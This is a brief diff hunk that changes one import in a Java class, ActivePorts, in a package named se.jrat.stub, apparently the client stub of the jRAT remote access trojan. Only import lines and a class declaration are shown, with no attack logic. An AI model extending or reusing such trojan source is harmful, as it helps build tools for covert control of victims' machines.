@@ -3,8 +3,9 @@ package se.jrat.stub;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet51ActivePort;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class ActivePorts extends Thread {
